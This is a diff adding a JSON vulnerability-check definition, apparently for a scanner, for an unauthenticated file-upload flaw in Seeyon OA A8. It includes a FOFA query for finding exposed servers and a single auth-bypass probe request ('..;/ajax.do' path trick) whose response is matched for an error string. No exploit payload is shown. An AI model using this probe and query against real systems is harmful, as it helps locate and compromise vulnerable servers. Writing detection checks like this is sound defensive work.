@@ -1,0 +1,57 @@
+{
+  "Name": "Seeyon OA A8 unauth file upload getshell",
+  "Description": "Since some interfaces of the old version of Zhiyuan OA can be accessed without authorization, and some functions have insufficient filtering, attackers can upload malicious script files without authorization by constructing malicious requests to control the server.",
+  "Product": "Yonyou-Seeyon-OA",
+  "Homepage": "https://www.seeyon.com/",
+  "DisclosureDate": "2021-01-08",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Yonyou-Seeyon-OA\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/seeyon/thirdpartyController.do.css/..;/ajax.do"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "java.lang.NullPointerException:null",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["getshell"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Yonyou-Seeyon-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
